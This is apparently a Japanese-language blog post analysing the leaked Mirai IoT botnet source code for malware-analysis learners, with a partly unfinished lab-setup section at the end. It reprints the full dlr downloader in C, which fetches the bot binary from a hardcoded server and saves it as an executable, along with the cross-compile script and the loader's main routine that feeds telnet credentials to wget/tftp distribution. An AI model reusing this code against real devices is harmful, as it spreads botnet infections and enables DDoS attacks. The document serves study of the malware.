![](https://storage.googleapis.com/zenn-user-upload/68173bbca667-20231009.png)
# 目次

1. [はじめに](#はじめに)
2. [Miraiマルウェアとは](#Miraiマルウェアとは)
3. [攻撃手法](#攻撃手法)
4. [解析結果](#解析結果)
5. [対策方法](#対策方法)
6. [まとめ](#まとめ)
7. [参考文献](#参考文献)

# はじめに
今回は、MiraiというIoT機器を標的に攻撃を行うマルウェアを解析した結果を記しました。
※本投稿は悪意のある行為を助長するためのものではなく、あくまでマルウェアの挙動を学習したい方やマルウェア解析者を対象としたものです。また、本投稿は特定の誰かの行動を支持したり批判したりすることは一切なく、常に中立の第三者としての発言に基づいています。

# Miraiって？
-出荷時のデフォルトパスワードとユーザ名を使っているホームルータや防犯カメラのようなIoTデバイスに感染し、ボットネットの一部にする。
-2016年にKrebs On SecurityというウェブサイトをDDおS攻撃する等して流行。
-2016年にAnna-senpaiと名乗る人物がフォーラムにソースコードをリークしており、現在でも調べるとGitHub等でソースコードの閲覧が可能。
-ソースコードが公開されていることもあり、現在でもPastやOMGのような、Miraiの亜種が多く出回っている
-IoTデバイスの脆弱なデフォルトのパスワードとユーザ名を変更することが対策になる。
***
マルウェアのソースコードがリークされることはたまにあるみたいですが、Miraiは有名なマルウェアなので参考にできる情報も多くソースコードの開設もされているので、初心者が解析の練習するにはちょうど良い検体かなと思って選定しました。
ソースコードがどんな経緯でリークしたかは不明ですが、Anna-senpaiと名乗る人物がフォーラムでリークしたそうです。
マルウェアの教科書にも書いてありましたが、Contiというランサムグループがあり、そのグループのランサムのソースコードは金銭のいざこざで揉めてソースコードが流出したそうです。



# 参考にしたサイト
-https://atmarkit.itmedia.co.jp/ait/articles/1611/08/news028.html
-https://github.com/jgamblin/Mirai-Source-Code
-https://qiita.com/ueyasu/items/7eb4640d494576664109
-https://github.com/Glowman554/mirai
-https://en.wikipedia.org/wiki/Mirai_(malware)#:~:text=The%20Mirai%20botnet%20was%20first%20found%20in%20August,host%20OVH%2C%20and%20the%20October%202016%20Dyn%20cyberattack
-マルウェアの教科書

# ソースコードの解析
ソースコードは以下のGitHubから確認できます。留意点として、ソースコードをリークしたのはあくまでAnna-senpaiであり、以下のGitHubは第三者が載せたものです。
https://github.com/jgamblin/Mirai-Source-Code

次に、Miraiのボットネットを構成する要素は、大きく以下のようになります。

※図でインフラを示す

ITメディアが良い記事を出してくれてるので、まずはそれを参考にしながら各ファイルについて内容をざっくり把握します。
ディレクトリ構成はこんな感じだそうです。
![](https://storage.googleapis.com/zenn-user-upload/d5bb8b0f6bd6-20231001.png)

上から順にファイルを見ていきます。

## ForumPost.mdの要約
フォーラムでソースコードをリークしたAnna-senpaiの原文を、このGitHubの投稿者が加工したものです。内容はForumPost.txtと変わりません。

ForumPost.mdとForumPost.txtの2つがありますが、見たところ書いてある内容は大体一緒でした。ここの文章が、Forumにリークされた時の文章みたいです。
![](https://storage.googleapis.com/zenn-user-upload/d631013fb4e7-20231001.png)

以下に要約したものを記載します。
1. **Miraiの公開:**
   - 「Anna-senpai」は、2016年9月30日に、Miraiボットネットのソースコードを公開。

2. **動機と背景:**
   - Anna-senpaiは金銭目的でMiraiでの攻撃に参加したと思われる。
   - Anna-senpaiは「DDoS業界」に参加し、利益を得た後業界から撤退。
   - Miraiは最大で380,000のボットを制御できていたが、ISPの対策によってその数は減少傾向。当時、ボットを制御できる数が300,000まで減少した。

3. **設定と構築の手順:**
   - MiraiをビルドするためのCNCサーバーの設定、クロスコンパイラの設定について説明されています。
   - Anna-senpai曰く1時間でビルドできるそうです。

5. **名指しでの批判:**
   - malwaremustdieのブログ投稿に言及し、解析者の誤りを批判しています。

以上がAnna-senpaiの投稿内容の要約ですが、読んでみると結構煽りまくってる内容で、人柄が何となく見えて面白いです。ある意味では、これもサイバーセキュリティ業界における文化かもしれません。

## ForumPost.txtの内容
前述のとおり、ForumPost.mdと内容は同じなので詳細は割愛します。恐らくフォーラムでリークした際のAnna-senpaiの原文と思われます。

## LICENSE.md
ただのGNUライセンスに関するテンプレートなので割愛します。

## README.md
GitHubの投稿者によってMiraiの概要が記載されているだけなので割愛します。

## dlr
Miraiは、botに感染した端末がほかの侵害可能な端末をスキャンして拡散先を探します。
この時、拡散先として侵害可能と判断された端末上でダウンローダーを実行し、botに感染させます。
Miraiのソースコードにはdlrとloaderというフォルダがあり、それぞれ違いが分かりにくいですが、dlrは"botの頒布時にwgetやtftpが使えないときに利用するダウンローダー"で、loaderが、"メインのダウンローダー"という認識でよさそうです。
### release
| ファイル名  | 説明                                                                                  |
|------------|----------------------------------------------------------------------------------------|
| `dlr.arm`  | ARMアーキテクチャ向けのバイナリ。                                                      |
| `dlr.arm7` | ARMv7アーキテクチャ向けのバイナリ。                                                    |
| `dlr.m68k` | Motorola 68000（m68k）アーキテクチャ向けのバイナリ。                                    |
| `dlr.mips` | MIPSアーキテクチャ向けのバイナリ。                                                      |
| `dlr.mpsl` | 明確なプラットフォームが不明なバイナリ。
| `dlr.ppc`  | PowerPCアーキテクチャ向けのバイナリ。                                                  |
| `dlr.sh4`  | SuperH（SH-4）アーキテクチャ向けのバイナリ。                                            |
| `dlr.spc`  | 恐らくデジタル署名関連のファイル。

MiraiはIoTデバイスをターゲットとしており、IoTデバイスのハードウェアやアーキテクチャは多岐にわたります。
また、Miraiをビルドする際はクロスコンパイラを使用するので、複数の環境で実行できるダウンローダをバイナリとして出力しているものと推測されます。
今回はソースコードがあるので、各バイナリの内部までは解析しません。
### build.sh
ダウンローダーをコンパイルするためのシェルスクリプトです。
前述の./dlr/release配下にあったファイルは、このbuildスクリプトによって生成されたものと考えられます。
```sh
# ./dlr/main.cをコンパイルし、各プラットフォームで動作するバイナリを/release配下に出力している。
-----
armv4l-gcc -Os -D BOT_ARCH=\"arm\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.arm
armv6l-gcc -Os -D BOT_ARCH=\"arm7\" -D ARM -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.arm7
i686-gcc -Os -D BOT_ARCH=\"x86\" -D X32 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.x86
m68k-gcc -Os -D BOT_ARCH=\"m68k\" -D M68K -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.m68k
mips-gcc -Os -D BOT_ARCH=\"mips\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mips
#mips64-gcc -Os -D BOT_ARCH=\"mps64\" -D MIPS -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mps64
mipsel-gcc -Os -D BOT_ARCH=\"mpsl\" -D MIPSEL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.mpsl
powerpc-gcc -Os -D BOT_ARCH=\"ppc\" -D PPC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.ppc
sh4-gcc -Os -D BOT_ARCH=\"sh4\" -D SH4 -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh4
#sh2elf-gcc -Os -D BOT_ARCH=\"sh2el\" -D SH2EL -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh2el
#sh2eb-gcc -Os -D BOT_ARCH=\"sh2eb\" -D SH2EB -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.sh2eb
sparc-gcc -Os -D BOT_ARCH=\"spc\" -D SPARC -Wl,--gc-sections -fdata-sections -ffunction-sections -e __start -nostartfiles -static main.c -o ./release/dlr.spc
-----
# <以下省略>
```
### main.c
C言語で書かれています。
コードの概要を説明すると、ダウンロード元のサーバIPをコード内でハードコードしており、サーバIP/bins/miraiに対してGETリクエストを送り、ファイルをカレントディレクトリにダウンロードします。

```c
// 他のファイルからも関数として呼び出すため、定数としてマルウェアをダウンロードする元となるサーバのIPアドレス等を指定します。
#include <sys/types.h>
//#include <bits/syscalls.h>
#include <sys/syscall.h>
#include <fcntl.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define HTTP_SERVER utils_inet_addr(127,0,0,1) // CHANGE TO YOUR HTTP SERVER IP ハードコードしてダウンロード元のIPアドレスを指定
```

:::details main.cの続きを表示する
```c
#define EXEC_MSG            "MIRAI\n"
#define EXEC_MSG_LEN        6

#define DOWNLOAD_MSG        "FIN\n"
#define DOWNLOAD_MSG_LEN    4

#define STDIN   0
#define STDOUT  1
#define STDERR  2

#if BYTE_ORDER == BIG_ENDIAN // ビッグエンディアンとリトルエンディアンの時で処理を分岐させています。TCP/IPのようなネットワーク間でデータを送受信する際にエンディアンの違いを吸収するために使用されるようです。
#define HTONS(n) (n)
#define HTONL(n) (n)
#elif BYTE_ORDER == LITTLE_ENDIAN
#define HTONS(n) (((((unsigned short)(n) & 0xff)) << 8) | (((unsigned short)(n) & 0xff00) >> 8))
#define HTONL(n) (((((unsigned long)(n) & 0xff)) << 24) | \
                  ((((unsigned long)(n) & 0xff00)) << 8) | \
                  ((((unsigned long)(n) & 0xff0000)) >> 8) | \
                  ((((unsigned long)(n) & 0xff000000)) >> 24))
#else
#error "Fix byteorder"
#endif

#ifdef __ARM_EABI__
#define SCN(n) ((n) & 0xfffff)
#else
#define SCN(n) (n)
#endif

inline void run(void);
int sstrlen(char *);
unsigned int utils_inet_addr(unsigned char, unsigned char, unsigned char, unsigned char);

/* stdlib calls */
int xsocket(int, int, int);
int xwrite(int, void *, int);
int xread(int, void *, int);
int xconnect(int, struct sockaddr_in *, int);
int xopen(char *, int, int);
int xclose(int);
void x__exit(int);

#define socket xsocket
#define write xwrite
#define read xread
#define connect xconnect
#define open xopen
#define close xclose
#define __exit x__exit

#ifdef DEBUG
/*
void xprintf(char *str)
{
    write(1, str, sstrlen(str));
}
#define printf xprintf
*/
#endif

void __start(void) // main.cのエントリーポイント
{ 
#if defined(MIPS) || defined(MIPSEL)
    __asm(
        ".set noreorder\n"
        "move $0, $31\n"
        "bal 10f\n"
        "nop\n"
        "10:\n.cpload $31\n"
        "move $31, $0\n"
        ".set reorder\n"
    );
#endif
    run();
}

// メインの処理
inline void run(void)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd, ret;
    unsigned int header_parser = 0;
    int arch_strlen = sstrlen(BOT_ARCH);

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET; // AF_INT (IPv4)を指定
    addr.sin_port = HTONS(80); // HTTP通信なのでポート80を使用する
    addr.sin_addr.s_addr = HTTP_SERVER; // 同ファイル内でハードコードして指定したダウンロード元のサーバを指定

    ffd = open("dvrHelper", O_WRONLY | O_CREAT | O_TRUNC, 0777);

    sfd = socket(AF_INET, SOCK_STREAM, 0);

#ifdef DEBUG
    if (ffd == -1)
        printf("Failed to open file!\n");
    if (sfd == -1)
        printf("Failed to call socket()\n");
#endif

    if (sfd == -1 || ffd == -1)
        __exit(1);

#ifdef DEBUG
    printf("Connecting to host...\n");
#endif

    if ((ret = connect(sfd, &addr, sizeof (struct sockaddr_in))) < 0)
    {
#ifdef DEBUG
        printf("Failed to connect to host.\n");
#endif
        write(STDOUT, "NIF\n", 4);
        __exit(-ret);
    }

#ifdef DEBUG
    printf("Connected to host\n");
#endif

// サーバIP/bins/miraiに対して、HTTP GETリクエストを送信, HTTP 1.0を使用, ファイルはカレントディレクトリに保存される
    if (write(sfd, "GET /bins/mirai." BOT_ARCH " HTTP/1.0\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
#ifdef DEBUG
        printf("Failed to send get request.\n");
#endif

        __exit(3);
    }

#ifdef DEBUG
    printf("Started header parse...\n");
#endif

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }

#ifdef DEBUG
    printf("Finished receiving HTTP header\n");
#endif

// ファイルのダウンロード処理
    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}

int sstrlen(char *str)
{
    int c = 0;

    while (*str++ != 0)
        c++;
    return c;
}

unsigned int utils_inet_addr(unsigned char one, unsigned char two, unsigned char three, unsigned char four)
{
    unsigned long ip = 0;

    ip |= (one << 24);
    ip |= (two << 16);
    ip |= (three << 8);
    ip |= (four << 0);
    return HTONL(ip);
}

int xsocket(int domain, int type, int protocol)
{
#if defined(__NR_socketcall)
#ifdef DEBUG
    printf("socket using socketcall\n");
#endif
    struct {
        int domain, type, protocol;
    } socketcall;
    socketcall.domain = domain;
    socketcall.type = type;
    socketcall.protocol = protocol;

    // 1 == SYS_SOCKET
    int ret = syscall(SCN(SYS_socketcall), 1, &socketcall);

#ifdef DEBUG
    printf("socket got ret: %d\n", ret);
#endif
     return ret;
#else
#ifdef DEBUG
    printf("socket using socket\n");
#endif
    return syscall(SCN(SYS_socket), domain, type, protocol);
#endif
}

int xread(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_read), fd, buf, len);
}

int xwrite(int fd, void *buf, int len)
{
    return syscall(SCN(SYS_write), fd, buf, len);
}

int xconnect(int fd, struct sockaddr_in *addr, int len)
{
#if defined(__NR_socketcall)
#ifdef DEBUG
    printf("connect using socketcall\n");
#endif
    struct {
        int fd;
        struct sockaddr_in *addr;
        int len;
    } socketcall;
    socketcall.fd = fd;
    socketcall.addr = addr;
    socketcall.len = len;
    // 3 == SYS_CONNECT
    int ret = syscall(SCN(SYS_socketcall), 3, &socketcall);

#ifdef DEBUG
    printf("connect got ret: %d\n", ret);
#endif

    return ret;
#else
#ifdef DEBUG
    printf("connect using connect\n");
#endif
    return syscall(SCN(SYS_connect), fd, addr, len);
#endif
}

int xopen(char *path, int flags, int other)
{
    return syscall(SCN(SYS_open), path, flags, other);
}

int xclose(int fd)
{
    return syscall(SCN(SYS_close), fd);
}

void x__exit(int code)
{
    syscall(SCN(SYS_exit), code);
}
```
:::

個人的に面白かったポイントを列挙します。
   1. TCP/Iのようなネットワークプロトコルを使用する際はビッグエンディアンを指定するのが一般的だそうです。これまでGhidraでバイナリを見るときはWindows向けの実行ファイルを見ることが多かったので、メモリに展開された値はリトルエンディアンで記載されていました。このコードをコンパイルした./dlr/releaseにあるバイナリをGhidraで見たときにリトルエンディアンとビッグエンディアンのどちらで記載されているのか気になるところです。
   2. ダウンロード元となるサーバのIPアドレスがハードコードされているのが意外でした。
   3. 多数のバイナリをビルドしていましたが、ソースコードを見るといろいろなプラットフォームやアーキテクチャで動作するように書かれていました。
## loader
このフォルダにはダウンローダーに関するコードが含まれています。
前述のdlrもダウンローダーですが、こちらもダウンローダーです。こちらメインのダウンローダーみたいです。
Miraiのボットを拡散させるためのもので、Miraiに感染している端末がほかの感染可能な端末を見つけたとき、その端末にMiraiのボットをダウンロードさせるための役割を担っています。
※Miraiの全体概要図を挿入
### bins
### src
#### headers
main.cなどで使われるheaderファイルが含まれています。
#### main.c
ダウンロード元サーバのIPアドレスなどがハードコードされています。
サーバにはtelnetとwget、tftpを使用しています。
```c
// include部分は省略
static void *stats_thread(void *);

static struct server *srv; // serverの構造体を宣言

char *id_tag = "telnet";
```

:::details main.cの続きを表示
```c
int main(int argc, char **args) // loaderプログラムのエントリーポイント
{
    pthread_t stats_thrd;
    uint8_t addrs_len;
    ipv4_t *addrs;
    uint32_t total = 0;
    struct telnet_info info;

#ifdef DEBUG // デバッグ時の挙動
    addrs_len = 1;
    addrs = calloc(4, sizeof (ipv4_t));
    addrs[0] = inet_addr("0.0.0.0");
#else
    addrs_len = 2;
    addrs = calloc(addrs_len, sizeof (ipv4_t));

    addrs[0] = inet_addr("192.168.0.1"); // Address to bind to
    addrs[1] = inet_addr("192.168.1.1"); // Address to bind to
#endif

    if (argc == 2)
    {
        id_tag = args[1];
    }

    if (!binary_init())
    {
        printf("Failed to load bins/dlr.* as dropper\n");
        return 1;
    }

    // ファイルのダウンロード元となるサーバのIPアドレスを指定
    /*                                                                                   wget address           tftp address */
    if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs, 1024 * 64, "100.200.100.100", 80, "100.200.100.100")) == NULL)
    {
        printf("Failed to initialize server. Aborting\n");
        return 1;
    }

    pthread_create(&stats_thrd, NULL, stats_thread, NULL);

    // Read from stdin
    while (TRUE)
    {
        char strbuf[1024];

        if (fgets(strbuf, sizeof (strbuf), stdin) == NULL)
            break;

        util_trim(strbuf);

        if (strlen(strbuf) == 0)
        {
            usleep(10000);
            continue;
        }

        memset(&info, 0, sizeof(struct telnet_info));
        if (telnet_info_parse(strbuf, &info) == NULL)
            printf("Failed to parse telnet info: \"%s\" Format -> ip:port user:pass arch\n", strbuf);
        else
        {
            if (srv == NULL)
                printf("srv == NULL 2\n");

            server_queue_telnet(srv, &info);
            if (total++ % 1000 == 0)
                sleep(1);
        }

        ATOMIC_INC(&srv->total_input);
    }

    printf("Hit end of input.\n");

    while(ATOMIC_GET(&srv->curr_open) > 0)
        sleep(1);

    return 0;
}

static void *stats_thread(void *arg)
{
    uint32_t seconds = 0;

    while (TRUE)
    {
#ifndef DEBUG
        printf("%ds\tProcessed: %d\tConns: %d\tLogins: %d\tRan: %d\tEchoes:%d Wgets: %d, TFTPs: %d\n",
               seconds++, ATOMIC_GET(&srv->total_input), ATOMIC_GET(&srv->curr_open), ATOMIC_GET(&srv->total_logins), ATOMIC_GET(&srv->total_successes),
               ATOMIC_GET(&srv->total_echoes), ATOMIC_GET(&srv->total_wgets), ATOMIC_GET(&srv->total_tftps));
#endif
        fflush(stdout);
        sleep(1);
    }
}
```
:::

### build.debug.sh
名前の通り、デバッグ用のスクリプトです。
```sh
#!/bin/bash
gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o loader.dbg
```
### build.sh
こちらも名前の通り、"loader"という名前の実行可能ファイルをコンパイルするためのスクリプトです。コンパイル元となるソースコードは./srcフォルダ内のファイルが対象です。
```sh
#!/bin/bash
gcc -static -O3 -lpthread -pthread src/*.c -o loader
```


## mirai
## scripts

# ローカルでのMiraiボットネットの構築
ForumPost.mdにビルドの方法は書いてあるので、とりあえずその通りにやっていきます。

必要な環境
    -FlareVM
    -REMnux: 192.168.1.5/24
    -router: WAN側172.22.249.132/20, LAN側192.168.1.11/24

# Miraiのインフラ構成を見てみる
    -C2とボットが通信するには、ドメイン名を解決し、C2サーバのIPアドレスと通信できる必要がある
    -qbotより80倍速いSYNスキャナーをテルネットのブルートフォースで使用している。
    -48101ポートをデフォルトで使用してブルートフォースを行う
    -
# 設定箇所
    -./mirai/bot/table.h
    -./mirai/bot/table.c
        -TABLE_CND_DOMAIN
	-TABLE_CNC_PORT
	-TABLE_SCAN_CB_DOMAIN
	-TABLESCAN_CB_PORT

# 表層解析
まずはここから。使うツールはPEStudio, Floss, DIE
# 動的解析
# 静的解析
    -table.c
        -TABLE_CNC_DOMAIN→botがC2サーバに接続する際に、C2サーバのドメイン名を難読化して指定するところ。
	-
    -debug
        -enc→TABLE_CNC_DOMAINで設定するドメイン名を難読化するためのツール
